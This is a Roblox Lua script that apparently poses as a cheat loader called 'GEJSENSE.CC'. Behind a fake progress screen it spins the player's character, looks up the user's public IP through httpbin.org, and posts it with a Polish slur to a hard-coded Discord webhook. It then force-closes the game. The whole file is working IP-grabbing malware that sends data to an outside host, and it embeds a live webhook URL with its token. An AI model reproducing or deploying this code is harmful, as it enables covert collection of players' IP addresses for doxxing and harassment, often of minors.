local webhook = "https://discord.com/api/webhooks/1471817620993871873/Pzt190dzHH3sPKcxTEJQv5HPNCoJ8ArcVx0Y76rfnOLMY2t1TZo72e-8VuGDp3-KCiCn"

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999
gui.ResetOnSpawn = false

local main = Instance.new("Frame")
main.Parent = gui
main.Size = UDim2.new(0, 600, 0, 350)
main.Position = UDim2.new(0.5, -300, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.ClipsDescendants = true

local corner = Instance.new("UICorner")
corner.Parent = main
corner.CornerRadius = UDim.new(0, 20)

local stroke = Instance.new("UIStroke")
stroke.Parent = main
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 2
stroke.Transparency = 0.5

local title = Instance.new("TextLabel")
title.Parent = main
title.Size = UDim2.new(1, 0, 0, 80)
title.Position = UDim2.new(0, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "GEJSENSE.CC"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 50
title.Font = Enum.Font.GothamBlack

local barBg = Instance.new("Frame")
barBg.Parent = main
barBg.Size = UDim2.new(0.7, 0, 0, 8)
barBg.Position = UDim2.new(0.15, 0, 0.5, -4)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
barBg.BorderSizePixel = 0

local barCorner = Instance.new("UICorner")
barCorner.Parent = barBg
barCorner.CornerRadius = UDim.new(1, 0)

local bar = Instance.new("Frame")
bar.Parent = barBg
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bar.BorderSizePixel = 0

local barCorner2 = Instance.new("UICorner")
barCorner2.Parent = bar
barCorner2.CornerRadius = UDim.new(1, 0)

local procent = Instance.new("TextLabel")
procent.Parent = main
procent.Size = UDim2.new(1, 0, 0, 60)
procent.Position = UDim2.new(0, 0, 0.6, 0)
procent.BackgroundTransparency = 1
procent.Text = "0%"
procent.TextColor3 = Color3.fromRGB(255, 255, 255)
procent.TextSize = 48
procent.Font = Enum.Font.GothamBlack

local status = Instance.new("TextLabel")
status.Parent = main
status.Size = UDim2.new(1, 0, 0, 30)
status.Position = UDim2.new(0, 0, 0.7, 20)
status.BackgroundTransparency = 1
status.Text = "podpierdalanie ip...."
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.TextSize = 18
status.Font = Enum.Font.Gotham

spawn(function()
    while gui.Parent do
        pcall(function()
            humanoid.AutoRotate = true
            character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(36), 0))
            humanoid.Jump = true
        end)
        wait(0.01)
    end
end)

for i = 1, 100 do
    pcall(function()
        bar:TweenSize(UDim2.new(i/100, 0, 1, 0), Enum.EasingDirection.In, Enum.EasingStyle.Linear, 0.01)
        procent.Text = i .. "%"
    end)
    wait(0.01)
end

local ip = "Nieznane"
local request = syn and syn.request or http_request or request
if request then
    pcall(function()
        local ipResponse = request({
            Url = "https://httpbin.org/ip",
            Method = "GET"
        })
        if ipResponse and ipResponse.Body then
            local ipData = game:GetService("HttpService"):JSONDecode(ipResponse.Body)
            ip = ipData.origin
        end
    end)
end

if request then
    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "🛰️ **IP KURWY**\n```\n" .. ip .. "\n```"
            })
        })
    end)
end

wait(2)

pcall(function()
    gui:Destroy()
    game:Shutdown()
end)
